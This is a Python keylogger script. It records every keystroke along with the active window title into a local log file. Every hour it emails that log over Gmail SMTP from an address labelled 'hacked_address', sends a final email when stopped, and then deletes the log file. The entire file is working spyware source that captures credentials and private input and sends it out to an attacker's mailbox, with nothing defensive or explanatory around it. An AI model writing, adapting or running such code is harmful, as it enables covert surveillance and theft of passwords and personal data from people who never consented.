from pynput import keyboard
import logging
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
import pygetwindow as gw

log_dir = ""
log_file = "key_log1.txt"
log_file_path = os.path.join(log_dir, log_file)

logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Global variable to control the loop
running = True


def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            return active_window.title
        else:
            return "Unknown"
    except:
        return "Unknown"


def on_press(key):
    global running
    try:
        if hasattr(key, 'char'):  # Normal key press
            logging.info(f"{get_active_window()}: {key.char}")
        else:  # Special keys like 'Shift', 'Ctrl', etc.
            logging.info(f"{get_active_window()}: {key}")
    except Exception as e:
        print(f"Error logging key: {e}")

    if key == keyboard.Key.esc:  # Stop keylogger if 'Esc' key is pressed
        running = False


def send_email(log_file):
    from_addr = "hacked_address@gmail.com"
    to_addr = "Youraddress@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Keylogger Log File"

    with open(log_file, 'r') as f:
        body = f.read()
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        print("SMPT connection started")
        server.login(from_addr, "password")
        print("Logged in to SMTP server")
        text = msg.as_string()
        server.sendmail(from_addr, to_addr, text)
        print("Email sent seccessfully")
        server.quit()
    except Exception as e:
        print(f"failed to send email:{e}")


def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        while running:  # Keep the listener running while running is True
            listener.join()  # Blocks until a key is pressed


def stop_keylogger():
    global running
    running = False


def delete_log_file():
    try:
        os.remove(log_file_path)
        print(f"Deleted log file: {log_file_path}")
    except Exception as e:
        print(f"Error deleting log file: {e}")

if __name__ == "__main__":
    import threading

    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    try:
        while True:
            time.sleep(3600)  # Send email every hour
            send_email(log_file)
    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        print("\n Stopping keylogger...")
        stop_keylogger()  # Signal the keylogger thread to stop
        # keylogger_thread.join()
        print("stopped running")  # Wait for keylogger thread to finish

    # Send final email before exiting
    send_email(log_file)
    print("Keylogger stopped.")

    # Delete log file after keylogger stops
    delete_log_file()


